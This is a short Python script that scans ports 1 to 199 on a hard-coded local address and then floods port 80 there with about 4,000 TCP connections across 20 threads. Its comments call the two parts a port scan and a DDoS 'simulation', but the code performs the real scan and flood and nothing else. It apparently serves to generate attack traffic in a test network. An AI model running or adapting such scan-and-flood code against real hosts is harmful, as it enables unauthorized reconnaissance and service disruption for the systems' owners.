import socket
import threading

target = "192.168.1.5"

# 🔹 Port Scan Simulation
def port_scan():
    print("[*] Running Port Scan...")
    for port in range(1, 200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect((target, port))
            s.close()
        except:
            pass

# 🔹 DDoS Simulation
def ddos():
    print("[*] Running DDoS...")
    
    def flood():
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, 80))
                s.close()
            except:
                pass

    threads = []
    for _ in range(20):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Run both
port_scan()
ddos()